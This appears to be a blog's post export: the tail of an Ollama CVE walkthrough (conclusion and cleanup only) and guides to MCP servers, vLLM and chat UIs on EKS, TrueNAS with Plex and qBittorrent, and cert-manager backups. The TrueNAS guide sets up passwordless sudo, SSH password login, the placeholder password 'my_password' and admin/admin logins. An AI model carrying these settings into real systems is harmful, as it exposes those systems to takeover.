screen cast: Conclusion This walkthrough demonstrated that CVE-2024-37032 and CVE-2024-45436 are critical vulnerabilities that can lead to a full container compromise with relative ease. While we used a specific public PoC, the underlying vulnerability could be exploited in various ways. Cleanup Delete the Kali Linux EC2 instance, EC2 Key Pair, and related CloudFormation stack: export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" export AWS_EC2_KEY_PAIR_NAME=\"ollama-test\" export SOLUTION_KALI=\"KaliLinux-NICE-DCV\" export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export TMP_DIR=\"${TMP_DIR:-${PWD}/tmp}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" # Delete CloudFormation stack aws cloudformation delete-stack --stack-name \"${SOLUTION_KALI}\" # Delete EKS cluster if exists if eksctl get cluster --name=\"${CLUSTER_NAME}\"; then eksctl delete cluster --name=\"${CLUSTER_NAME}\" --force fi # Delete VPC stack and EC2 key pair aws cloudformation delete-stack --stack-name \"${SOLUTION_KALI}-VPC\" aws ec2 delete-key-pair --key-name \"${AWS_EC2_KEY_PAIR_NAME}\" # Remove local files for FILE in ${TMP_DIR}/{vpc_cloudformation_template.yml,KaliLinux-NICE-DCV.yaml,${AWS_EC2_KEY_PAIR_NAME}.pem,helm_values-ollama.yml,kubeconfig-${CLUSTER_NAME}.conf}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done Enjoy … 😉" }, { "title": "MCP Servers running on Kubernetes", "url": "/posts/mcp-servers-k8s/", "categories": "Kubernetes, Cloud", "tags": "amazon-eks, eks-auto-mode, kubernetes, mcp", "date": "2025-05-27 00:00:00 +0200", "content": "In the previous post, Build secure and cheap Amazon EKS Auto Mode I used cert-manager to obtain a wildcard certificate for the Ingress. This post will explore running various MCP servers in Kubernetes, aiming to power a web chat application like ChatGPT for data queries. This post will guide you through the following steps: ToolHive Installation: Setting up ToolHive, a secure manager for MCP servers in Kubernetes. MCP Server Deployment: Deploying mkp and osv MCP servers. LibreChat Installation: Installing and configuring LibreChat, a self-hosted web chat application. vLLM Installation: Setting up vLLM, a high-throughput inference engine for Large Language Models. Open WebUI Installation: Setting up Open WebUI, a user-friendly interface for chat interactions. By the end of this tutorial, you’ll have a fully functional chat application powered by MCP servers and local LLM inference running on your EKS cluster. Requirements Amazon EKS Auto Mode cluster (described in Build secure and cheap Amazon EKS Auto Mode) AWS CLI eksctl Helm kubectl You will need the following environment variables. Replace the placeholder values with your actual credentials: Variables used in the following steps: export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export MY_EMAIL=\"petr.ruzicka@gmail.com\" export TMP_DIR=\"${TMP_DIR:-${PWD}/tmp}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" export TAGS=\"${TAGS:-Owner=${MY_EMAIL},Environment=dev,Cluster=${CLUSTER_FQDN}}\" mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Install ToolHive ToolHive is an open-source, lightweight, and secure manager for MCP (Model Context Protocol) servers, designed to simplify the deployment and management of AI model servers in Kubernetes environments. Install toolhive-operator-crds and toolhive-operator helm charts. Install the toolhive-operator-crds and toolhive-operator Helm charts: # renovate: datasource=github-tags depName=stacklok/toolhive extractVersion=^toolhive-operator-crds-(?&lt;version&gt;.*)$ TOOLHIVE_OPERATOR_CRDS_HELM_CHART_VERSION=\"0.0.13\" helm upgrade --install --version=\"${TOOLHIVE_OPERATOR_CRDS_HELM_CHART_VERSION}\" toolhive-operator-crds oci://ghcr.io/stacklok/toolhive/toolhive-operator-crds # renovate: datasource=github-tags depName=stacklok/toolhive extractVersion=^toolhive-operator-(?&lt;version&gt;.*)$ TOOLHIVE_OPERATOR_HELM_CHART_VERSION=\"0.2.1\" helm upgrade --install --version=\"${TOOLHIVE_OPERATOR_HELM_CHART_VERSION}\" --namespace toolhive-system --create-namespace toolhive-operator oci://ghcr.io/stacklok/toolhive/toolhive-operator Deploy MCP Servers Create a secret with your GitHub token and deploy the mkp and osv MCP servers: # renovate: datasource=github-tags depName=stacklok/toolhive TOOLHIVE_VERSION=\"0.2.3\" kubectl apply -f \"https://raw.githubusercontent.com/stacklok/toolhive/refs/tags/v${TOOLHIVE_VERSION}/examples/operator/mcp-servers/mcpserver_mkp.yaml\" Create the OSV MCP Servers: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-toolhive-mcpserver-osv.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: toolhive.stacklok.dev/v1alpha1 kind: MCPServer metadata: name: osv namespace: toolhive-system spec: image: ghcr.io/stackloklabs/osv-mcp/server transport: streamable-http port: 8080 permissionProfile: type: builtin name: network resources: limits: cpu: 100m memory: 128Mi requests: cpu: 50m memory: 64Mi EOF Enabling Karpenter to Provision amd64 Node Pools vLLM only works with Nvidia GPU and amd64-based CPU instances. To enable Karpenter to provision an amd64 node pool, create a new NodePool resource as shown below: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-karpenter-nodepool-amd64.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: eks.amazonaws.com/v1 kind: NodeClass metadata: name: my-default-gpu spec: $(kubectl get nodeclasses default -o yaml | yq '.spec | pick([\"role\", \"securityGroupSelectorTerms\", \"subnetSelectorTerms\"])' | sed 's/\\(.*\\)/ \\1/') ephemeralStorage: size: 40Gi --- apiVersion: karpenter.sh/v1 kind: NodePool metadata: name: my-default-amd64-gpu spec: template: spec: nodeClassRef: group: eks.amazonaws.com kind: NodeClass name: my-default-gpu requirements: - key: karpenter.sh/capacity-type operator: In values: [\"spot\", \"on-demand\"] - key: topology.kubernetes.io/zone operator: In values: [\"${AWS_DEFAULT_REGION}a\"] - key: kubernetes.io/arch operator: In values: [\"amd64\"] - key: node.kubernetes.io/instance-type operator: In # g6.xlarge: NVIDIA L4 GPU, 4 vCPUs, 16 GiB RAM, x86_64 architecture values: [\"g6.xlarge\"] taints: - key: nvidia.com/gpu value: \"true\" effect: NoSchedule limits: cpu: 16 memory: 64Gi nvidia.com/gpu: 4 --- apiVersion: eks.amazonaws.com/v1 kind: NodeClass metadata: name: my-default-amd64 spec: $(kubectl get nodeclasses default -o yaml | yq '.spec | pick([\"role\", \"securityGroupSelectorTerms\", \"subnetSelectorTerms\"])' | sed 's/\\(.*\\)/ \\1/') ephemeralStorage: size: 40Gi --- apiVersion: karpenter.sh/v1 kind: NodePool metadata: name: my-default-amd64 spec: template: spec: nodeClassRef: group: eks.amazonaws.com kind: NodeClass name: my-default-amd64 requirements: - key: eks.amazonaws.com/instance-category operator: In values: [\"t\"] - key: karpenter.sh/capacity-type operator: In values: [\"spot\", \"on-demand\"] - key: topology.kubernetes.io/zone operator: In values: [\"${AWS_DEFAULT_REGION}a\"] - key: kubernetes.io/arch operator: In values: [\"amd64\"] limits: cpu: 8 memory: 32Gi EOF Install vLLM vLLM is a high-throughput and memory-efficient inference engine for Large Language Models (LLMs). It provides fast and scalable LLM serving with features like continuous batching, PagedAttention, and support for various model architectures. Set up PersistentVolume (PV) and PersistentVolumeClaim (PVC) to store vLLM chat templates: kubectl create namespace vllm tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-vllm-vllm-chat-templates.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: v1 kind: PersistentVolumeClaim metadata: name: vllm-templates-pvc namespace: vllm spec: accessModes: - ReadWriteOnce resources: requests: storage: 1Gi --- apiVersion: v1 kind: Pod metadata: name: vllm-templates-downloader namespace: vllm spec: containers: - name: vllm-templates-downloader image: busybox:latest command: [\"wget\", \"-P\", \"/data/\", \"https://raw.githubusercontent.com/vllm-project/vllm/66785cc05c05c7f19f319533c23d1998b9d80bf9/examples/template_chatml.jinja\"] volumeMounts: - mountPath: /data name: vllm-templates volumes: - name: vllm-templates persistentVolumeClaim: claimName: vllm-templates-pvc restartPolicy: Never EOF kubectl wait --for=jsonpath='{.status.phase}'=Succeeded pod/vllm-templates-downloader -n vllm kubectl delete pod vllm-templates-downloader -n vllm Install vllm helm chart and modify the default values. # renovate: datasource=helm depName=vllm registryUrl=https://vllm-project.github.io/production-stack VLLM_HELM_CHART_VERSION=\"0.1.5\" helm repo add vllm https://vllm-project.github.io/production-stack cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-vllm.yml\" &lt;&lt; EOF servingEngineSpec: runtimeClassName: \"\" modelSpec: # https://huggingface.co/TinyLlama/TinyLlama-1.1B-Chat-v1.0/resolve/main/config.json (license: apache-2.0) - name: tinyllama-1-1b-chat-v1-0 annotations: model: tinyllama-1-1b-chat-v1-0 podAnnotations: model: tinyllama-1-1b-chat-v1-0 repository: vllm/vllm-openai tag: latest modelURL: TinyLlama/TinyLlama-1.1B-Chat-v1.0 replicaCount: 1 requestCPU: 2 requestMemory: 8Gi requestGPU: 0 limitCPU: 8 limitMemory: 32Gi nodeSelectorTerms: - matchExpressions: - key: kubernetes.io/arch operator: In values: [\"amd64\"] pvcStorage: 5Gi # https://huggingface.co/microsoft/phi-2/resolve/main/config.json (license: apache-2.0) - name: phi-2 annotations: model: phi-2 podAnnotations: model: phi-2 repository: vllm/vllm-openai tag: latest modelURL: microsoft/phi-2 replicaCount: 1 requestCPU: 2 requestMemory: 8Gi requestGPU: 1 limitCPU: 8 limitMemory: 32Gi chatTemplate: \"/templates/template_chatml.jinja\" nodeSelectorTerms: - matchExpressions: - key: kubernetes.io/arch operator: In values: [\"amd64\"] pvcStorage: 20Gi - name: granite-3-1-3b-a800m-instruct annotations: model: granite-3-1-3b-a800m-instruct podAnnotations: model: granite-3-1-3b-a800m-instruct repository: vllm/vllm-openai tag: latest modelURL: ibm-granite/granite-3.1-3b-a800m-instruct replicaCount: 1 requestCPU: 2 requestMemory: 8Gi requestGPU: 1 limitCPU: 8 limitMemory: 32Gi nodeSelectorTerms: - matchExpressions: - key: kubernetes.io/arch operator: In values: [\"amd64\"] pvcStorage: 20Gi routerSpec: resources: requests: cpu: 1 memory: 2Gi limits: cpu: 2 memory: 4Gi nodeSelectorTerms: - matchExpressions: - key: kubernetes.io/arch operator: In values: [\"amd64\"] EOF helm upgrade --install --version \"${VLLM_HELM_CHART_VERSION}\" --namespace vllm --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-vllm.yml\" vllm vllm/vllm-stack Install LibreChat LibreChat is an open-source, self-hosted web chat application designed as an enhanced alternative to ChatGPT. It supports multiple AI providers (including OpenAI, Azure, Google, and more), offers a user-friendly interface, conversation management, plugin support, and advanced features like prompt templates and file uploads. Create librechat namespace and secrets with environment variables: kubectl create namespace librechat ( set +x kubectl create secret generic --namespace librechat librechat-credentials-env \\ --from-literal=CREDS_KEY=\"$(openssl rand -hex 32)\" \\ --from-literal=CREDS_IV=\"$(openssl rand -hex 16)\" \\ --from-literal=JWT_SECRET=\"$(openssl rand -hex 32)\" \\ --from-literal=JWT_REFRESH_SECRET=\"$(openssl rand -hex 32)\" ) Install librechat helm chart and modify the default values. # renovate: datasource=helm depName=librechat registryUrl=https://charts.blue-atlas.de LIBRECHAT_HELM_CHART_VERSION=\"1.8.10\" helm repo add librechat https://charts.blue-atlas.de cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-librechat.yml\" &lt;&lt; EOF librechat: # https://www.librechat.ai/docs/configuration/dotenv configEnv: ALLOW_EMAIL_LOGIN: \"true\" ALLOW_REGISTRATION: \"true\" ENDPOINTS: agents,custom existingSecretName: librechat-credentials-env # https://github.com/danny-avila/LibreChat/blob/main/librechat.example.yaml configYamlContent: | version: 1.2.1 cache: true endpoints: custom: - name: vLLM apiKey: vllm baseURL: http://vllm-router-service.vllm.svc.cluster.local/v1 models: default: ['TinyLlama/TinyLlama-1.1B-Chat-v1.0'] fetch: true mcpServers: mkp: type: sse url: http://mcp-mkp-proxy.toolhive-system.svc.cluster.local:8080/sse osv: type: sse url: http://mcp-osv-proxy.toolhive-system.svc.cluster.local:8080/sse imageVolume: enabled: false image: tag: \"v0.8.0-rc1\" ingress: annotations: gethomepage.dev/enabled: \"true\" gethomepage.dev/description: LibreChat is an open-source, self-hosted web chat application designed as an enhanced alternative to ChatGPT gethomepage.dev/group: Apps gethomepage.dev/icon: https://raw.githubusercontent.com/danny-avila/LibreChat/8f20fb28e549949b05e8b164d8a504bc14c0951a/client/public/assets/logo.svg gethomepage.dev/name: LibreChat nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri hosts: - host: librechat.${CLUSTER_FQDN} paths: - path: / pathType: ImplementationSpecific tls: - hosts: - librechat.${CLUSTER_FQDN} # https://github.com/bitnami/charts/blob/main/bitnami/mongodb/values.yaml mongodb: nodeSelector: kubernetes.io/arch: amd64 meilisearch: enabled: false EOF helm upgrade --install --version \"${LIBRECHAT_HELM_CHART_VERSION}\" --namespace librechat --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-librechat.yml\" librechat librechat/librechat LibreChat Install Open WebUI Open WebUI is a user-friendly web interface for chat interactions. Install open-webui helm chart and modify the default values. # renovate: datasource=helm depName=open-webui registryUrl=https://helm.openwebui.com OPEN_WEBUI_HELM_CHART_VERSION=\"7.0.1\" helm repo add open-webui https://helm.openwebui.com/ cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-open-webui.yml\" &lt;&lt; EOF ollama: enabled: false pipelines: enabled: false ingress: enabled: true annotations: gethomepage.dev/enabled: \"true\" gethomepage.dev/description: Open WebUI is a user friendly web interface for chat interactions. gethomepage.dev/group: Apps gethomepage.dev/icon: https://raw.githubusercontent.com/open-webui/open-webui/14a6c1f4963892c163821765efcc10c5c4578454/static/static/favicon.svg gethomepage.dev/name: Open WebUI nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri host: open-webui.${CLUSTER_FQDN} persistence: size: 3Gi extraEnvVars: - name: ADMIN_EMAIL value: ${MY_EMAIL} - name: ENV value: dev - name: WEBUI_URL value: https://open-webui.${CLUSTER_FQDN} - name: OPENAI_API_BASE_URL value: http://vllm-router-service.vllm.svc.cluster.local/v1 - name: DEFAULT_MODELS value: TinyLlama/TinyLlama-1.1B-Chat-v1.0 - name: ENABLE_EVALUATION_ARENA_MODELS value: \"False\" - name: ENABLE_CODE_INTERPRETER value: \"False\" EOF helm upgrade --install --version \"${OPEN_WEBUI_HELM_CHART_VERSION}\" --namespace open-webui --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-open-webui.yml\" open-webui open-webui/open-webui Open WebUI Clean-up Remove files from the ${TMP_DIR}/${CLUSTER_FQDN} directory: for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{k8s-toolhive-mcpserver-osv,k8s-karpenter-nodepool-amd64,k8s-vllm-vllm-chat-templates,helm_values-{vllm,librechat,open-webui}}.yml; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done Enjoy … 😉" }, { "title": "TrueNAS CE 25.04 with Plex and qBittorrent", "url": "/posts/truenas-plex-torrent/", "categories": "Linux, Storage", "tags": "storage, torrent", "date": "2025-02-18 00:00:00 +0100", "content": "I had the opportunity to test the Dell OptiPlex 3000 Thin Client with TrueNAS Community Edition 25.04. The machine is equipped with 2 CPUs, 8GB of RAM, and 64GB of eMMC storage. 🕹️ Recorded screen cast: Installation Put the TrueNAS CE 25.04 ISO on a USB stick using balenaEtcher. Make sure to disable Secure Boot in the BIOS before proceeding. Boot TrueNAS from the USB stick and follow these steps: Shell Run commands: sed -i 's/-n3:0:0/-n3:0:+16G/' /usr/lib/python3/dist-packages/truenas_installer/install.py # exit Install/Upgrade Select the disk to install TrueNAS (mmcblk0) Administrative user (truenas_admin) … Links: How to Install TrueNAS CORE on an SSD NVMe/SATA Partition and Reclaim Unused Boot-Pool Space Install TrueNAS SCALE on a partition instead of the full disk Configuration The admin username for the TrueNAS WebUI is truenas_admin, and the password is the same as the root password set during the installation. Settings Configure General Settings (GUI, Localization, and Email Settings), Advanced Settings (Access), Services (SMB, SSH), and Shell (Create and Export pool): graph LR subgraph truenas[TrueNAS] system[System] --&gt; general_settings[General Settings] system --&gt; advanced_settings[Advanced Settings] system --&gt; services[Services] system --&gt; shell[Shell] end subgraph general_settings_dashboard[General Settings] general_settings --&gt; gui_settings[GUI Settings] gui_settings --&gt; web_interface_http_https_redirect[Web Interface HTTP -&gt; HTTPS Redirect] general_settings --&gt; localization_settings[Localization Settings] localization_settings --&gt; timezone[Timezone: Europe/Prague] general_settings --&gt; email_settings[Email Settings] email_settings --&gt; send_mail_method[Send Mail Method: GMail OAuth] end subgraph advanced_settings_dashboard[Advanced Settings] advanced_settings --&gt; access_configure[Access Configure] access_configure --&gt; session_timeout[Session Timeout: 30000] end subgraph services_dashboard[Services] services --&gt; smb[SMB] services --&gt; ssh[SSH] end subgraph shell_dashboard[Shell] shell --&gt; commands[$ sudo su&lt;br&gt;# sgdisk -n0:0:0 -t0:BF01 /dev/mmcblk0&lt;br&gt;# partprobe&lt;br&gt;# zpool create -f -R /mnt -O compression=lz4 -O atime=off my-local-disk-pool /dev/mmcblk0p4&lt;br&gt;# zpool export my-local-disk-pool] end click general_settings \"https://truenas.local/ui/system/general\" click advanced_settings \"https://truenas.local/ui/system/advanced\" click services \"https://truenas.local/ui/system/services\" click shell \"https://truenas.local/ui/system/shell\" style commands text-align:left Create and Import Storage pool Import the previously created pool (my-local-disk-pool) and create a new pool named my-pool: graph LR subgraph truenas[TrueNAS] storage[Storage] end subgraph storage_dashboard[Storage Dashboard] storage --&gt; import_pool[Import Pool] import_pool --&gt; pool[Pool: my-local-disk-pool] storage --&gt; create_pool[Create Pool] create_pool --&gt; name[Name: my-pool&lt;br&gt;Layout: Stripe&lt;br&gt;] end click storage \"https://truenas.local/ui/storage\" click create_pool \"https://truenas.local/ui/storage/create\" Create Dataset Create the data dataset in the my-pool pool and the plex dataset in the my-local-disk-pool storage pool, ensuring proper permissions are configured for each: graph LR subgraph truenas[TrueNAS] datasets[Datasets] end subgraph datasets_dashboard[Datasets] datasets --&gt; dataset_name_my_pool[Dataset Name: my-pool] dataset_name_my_pool --&gt; add_dataset_my_pool[Add Dataset] add_dataset_my_pool --&gt; name_data[Name: data] add_dataset_my_pool --&gt; dataset_preset_data[Dataset Preset -&gt; SMB] end subgraph datasets_dashboard[Datasets] datasets --&gt; dataset_name_my_local_disk_pool[Dataset Name: my-local-disk-pool] dataset_name_my_local_disk_pool --&gt; add_dataset_my_local_disk_pool[Add Dataset] add_dataset_my_local_disk_pool --&gt; name_data_plex[Name: plex] add_dataset_my_local_disk_pool --&gt; dataset_preset_plex[Dataset Preset -&gt; Apps] end click datasets \"https://truenas.local/ui/datasets\" graph LR subgraph truenas[TrueNAS] datasets[Datasets] end subgraph datasets_dashboard[Datasets] datasets --&gt; dataset_name[Dataset Name: my-pool -&gt; data] dataset_name --&gt; permissions[Permissions -&gt; Edit] end subgraph edit_acl_dashboard[Edit ACL] permissions --&gt; add_item[\"\\+ Add Item\"] add_item --&gt; who[Who -&gt; Group] add_item --&gt; group[Group -&gt; apps] add_item --&gt; apply_permissions_recursively[Apply permissions recursively] add_item --&gt; save_access_control_list[Save Access Control List] end click datasets \"https://truenas.local/ui/datasets\" Configure Credentials Create a new user named ruzickap, and update the password and email address for the existing truenas_admin user: graph LR subgraph truenas[TrueNAS] credentials[Credentials] --&gt; backup_credentials[Backup Credentials] credentials --&gt; users[Users] end subgraph backup_credentials_dashboard[Backup Credentials] backup_credentials --&gt; provider[Provider: Microsoft OneDrive] provider --&gt; oauth_authentication[OAuth Authentication -&gt; Log In To Provider] backup_credentials --&gt; drives_list[Drives List -&gt; OneDrive] end subgraph users_dashboard_[Users] users --&gt; add[Add] add --&gt; add_full_name[Full Name: Petr Ruzicka] add --&gt; add_username[Username: ruzickap] add --&gt; add_password[Password: my_password] add --&gt; add_email[Email: petr.ruzicka\\@gmail.com] add --&gt; add_confirm_password[Confirm Password: my_password] add --&gt; add_confirm_password_auxiliary_groups[Auxiliary Groups: builtin_administrators, docker] add --&gt; add_home_directory[Home Directory: /mnt/my-local-disk-pool] add --&gt; add_ssh_password_login_enabled[SSH password login enabled] add --&gt; add_shell[Shell: bash] add --&gt; add_allow_all_sudo_commands[Allow all sudo commands] add --&gt; add_allow_all_sudo_commands_with_no_password[Allow all sudo commands with no password] add --&gt; add_create_home_directory[Create Home Directory] users --&gt; truenas_admin[truenas_admin] truenas_admin --&gt; edit[Edit] edit --&gt; edit_new_password[New Password: my_password] edit --&gt; edit_email[Email: petr.ruzicka\\@gmail.com] edit --&gt; edit_confirm_new_password[Confirm New Password: my_password] edit --&gt; edit_allow_all_sudo_commands_with_no_password[Allow all sudo commands with no password] end click users \"https://truenas.local/ui/credentials/users\" click backup_credentials \"https://truenas.local/ui/credentials/backup-credentials\" Add Applications Configure the applications to use the my-local-disk-pool pool as their designated storage location: graph LR subgraph truenas[TrueNAS] apps[Apps] end subgraph applications_installed_dashboard[Applications Installed] apps --&gt; configuration[Configuration] configuration --&gt; choose_pool[Choose Pool] choose_pool --&gt; pool[Pool: my-local-disk-pool] end click apps \"https://truenas.local/ui/apps/installed\" OpenSpeedTest Install the OpenSpeedTest application to easily measure network speed and performance: graph LR subgraph truenas[TrueNAS] apps[Apps] end subgraph applications_installed_dashboard[Applications Installed] apps --&gt; discover_apps[Discover Apps] discover_apps --&gt; open_speed_test[Open Speed Test] open_speed_test --&gt; install[Install] end click apps \"https://truenas.local/ui/apps/installed\" Test the OpenSpeedTest web interface by accessing it through the local instance. File Browser Add the File Browser application to manage files easily through a user-friendly web interface: graph LR subgraph truenas[TrueNAS] apps[Apps] end subgraph applications_installed_dashboard[Applications Installed] apps --&gt; discover_apps[Discover Apps] discover_apps --&gt; file_browser[File Browser] file_browser --&gt; install[Install] install --&gt; storage_configuration[Storage Configuration] storage_configuration --&gt; additional_storage[Additional Storage -&gt; Add] additional_storage --&gt; data_storage_type[Type: Host Path] additional_storage --&gt; mount_path[Mount Path: /data] additional_storage --&gt; host_path[Host Path: /mnt/my-pool/data] end click apps \"https://truenas.local/ui/apps/installed\" Test the File Browser web interface by clicking the File Browser link and using the following login credentials: User: admin Password: admin qBittorrent Install the qBittorrent application to download torrents: graph LR subgraph truenas[TrueNAS] apps[Apps] end subgraph applications_installed_dashboard[Applications Installed] apps --&gt; discover_apps[Discover Apps] discover_apps --&gt; qbittorrent[qBittorrent] qbittorrent --&gt; install[Install] install --&gt; storage_configuration[Storage Configuration] storage_configuration --&gt; qbittorrent_downloads_storage[qBittorrent Downloads Storage] qbittorrent_downloads_storage --&gt; qbittorrent_configuration_storage_type[Type: Host Path] qbittorrent_downloads_storage --&gt; qbittorrent_configuration_storage_mount_path[Host Path: /mnt/my-pool/data] end click apps \"https://truenas.local/ui/apps/installed\" qBittorrent Configuration It is necessary to configure qBittorrent to work properly with the configured pools and datasets. Obtain the username and password for qBittorrent: graph LR subgraph truenas[TrueNAS] apps[Apps] end subgraph applications_installed_dashboard[Applications Installed] apps --&gt; qbittorrent[qbittorrent] qbittorrent --&gt; workloads[Workloads] workloads --&gt; qbittorrent_running[qbittorrent – Running] qbittorrent_running --&gt; view_logs[View Logs] view_logs --&gt; password[A temporary password is provided for this session: xxxxxx] end click apps \"https://truenas.local/ui/apps/installed\" Access the qBittorrent web interface and log in using the credentials obtained from the logs. Click the Options icon (typically a gear symbol) at the top and configure the following settings: graph LR options[Options] --&gt; downloads[Downloads] options[Options] --&gt; webui[WebUI] downloads --&gt; save_path[Delete .torrent files afterwards] downloads --&gt; default_save_path[Default Save Path: /downloads/torrents] webui --&gt; bypass[Bypass authentication for clients in whitelisted IP subnets: 192.168.1.0/24] Plex Install the Plex application for media streaming: graph LR subgraph truenas[TrueNAS] apps[Apps] end subgraph applications_installed_dashboard[Applications Installed] apps --&gt; discover_apps[Discover Apps] discover_apps --&gt; plex[Plex] plex --&gt; install[Install] install --&gt; storage_configuration[Storage Configuration] storage_configuration --&gt; plex_data_storage[Plex Data Storage] plex_data_storage --&gt; plex_data_storage_type[Type: Host Path] plex_data_storage --&gt; plex_data_storage_host_path[Host Path: /mnt/my-pool/data] storage_configuration --&gt; plex_configuration_storage[Plex Configuration Storage] plex_configuration_storage --&gt; plex_configuration_storage_type[Type: Host Path] plex_configuration_storage --&gt; plex_configuration_storage_host_path[Host Path: /mnt/my-local-disk-pool/plex] end click apps \"https://truenas.local/ui/apps/installed\" Configure Data Protection Configure Cloud Sync Tasks to back up Plex data to Microsoft OneDrive, and schedule regular S.M.A.R.T. tests: graph LR subgraph truenas[TrueNAS] data_protection[Data Protection] end subgraph data_protection_dashboard[Data Protection] data_protection --&gt; cloud_sync_tasks[Cloud Sync Tasks -&gt; Add] cloud_sync_tasks --&gt; provider[Credentials: Microsoft OneDrive] provider --&gt; what_and_when_direction[Direction: PUSH] provider --&gt; what_and_when_directory_files[Directory/Files: /mnt/my-local-disk-pool/plex] provider --&gt; what_and_when_folder[Folder: /truenas-backup-plex] provider --&gt; what_and_when_schedule[Schedule: Weekly] data_protection --&gt; periodic_smart_tests[Periodic S.M.A.R.T. Tests -&gt; Add] periodic_smart_tests --&gt; all_disks[All Disks] periodic_smart_tests --&gt; type[Type: SHORT] periodic_smart_tests --&gt; schedule[Schedule: Weekly] end click data_protection \"https://truenas.local/ui/data-protection\" Enjoy … 😉" }, { "title": "Amazon EKS Auto Mode with cert-manager and Velero", "url": "/posts/eks-auto-cert-manager-velero/", "categories": "Kubernetes, Cloud", "tags": "amazon-eks, eks-auto-mode, cert-manager, velero, eksctl, kubernetes", "date": "2025-02-01 00:00:00 +0100", "content": "In the previous post, “Build secure and cheap Amazon EKS Auto Mode”, I used cert-manager to obtain a wildcard certificate for the Ingress. When using Let’s Encrypt production certificates, it is useful to back them up and restore them when recreating the cluster. Here are a few steps to install Velero and perform the backup and restore procedure for cert-manager objects. Links: Backup and Restore Resources Requirements An Amazon EKS Auto Mode cluster (as described in “Build secure and cheap Amazon EKS Auto Mode”) AWS CLI eksctl Helm kubectl The following variables are used in the subsequent steps: export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export MY_EMAIL=\"petr.ruzicka@gmail.com\" export TMP_DIR=\"${TMP_DIR:-${PWD}/tmp}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" # Tags applied to identify AWS resources export TAGS=\"${TAGS:-Owner=${MY_EMAIL},Environment=dev,Cluster=${CLUSTER_FQDN}}\" mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Generate a Let’s Encrypt production certificate These steps only need to be performed once. Production-ready Let’s Encrypt certificates should generally be generated only once. The goal is to back up the certificate and then restore it whenever needed for a new cluster. Create a Let’s Encrypt production ClusterIssuer: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-clusterissuer-production.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-production-dns namespace: cert-manager labels: letsencrypt: production spec: acme: server: https://acme-v02.api.letsencrypt.org/directory email: ${MY_EMAIL} privateKeySecretRef: name: letsencrypt-production-dns solvers: - selector: dnsZones: - ${CLUSTER_FQDN} dns01: route53: {} EOF kubectl wait --namespace cert-manager --timeout=15m --for=condition=Ready clusterissuer --all kubectl label secret --namespace cert-manager letsencrypt-production-dns letsencrypt=production Create a new certificate and have it signed by Let’s Encrypt for validation: if ! aws s3 ls \"s3://${CLUSTER_FQDN}/velero/backups/\" | grep -q velero-monthly-backup-cert-manager-production; then tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-certificate-production.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: Certificate metadata: name: ingress-cert-production namespace: cert-manager labels: letsencrypt: production spec: secretName: ingress-cert-production secretTemplate: labels: letsencrypt: production issuerRef: name: letsencrypt-production-dns kind: ClusterIssuer commonName: \"*.${CLUSTER_FQDN}\" dnsNames: - \"*.${CLUSTER_FQDN}\" - \"${CLUSTER_FQDN}\" EOF kubectl wait --namespace cert-manager --for=condition=Ready --timeout=10m certificate ingress-cert-production fi Create S3 bucket The following step needs to be performed only once. Use CloudFormation to create an S3 bucket that will be used for storing Velero backups. if ! aws s3 ls \"s3://${CLUSTER_FQDN}\"; then cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/aws-s3.yml\" &lt;&lt; \\EOF AWSTemplateFormatVersion: 2010-09-09 Parameters: S3BucketName: Description: Name of the S3 bucket Type: String EmailToSubscribe: Description: Confirm subscription over email to receive a copy of S3 events Type: String Resources: S3Bucket: Type: AWS::S3::Bucket Properties: BucketName: !Ref S3BucketName 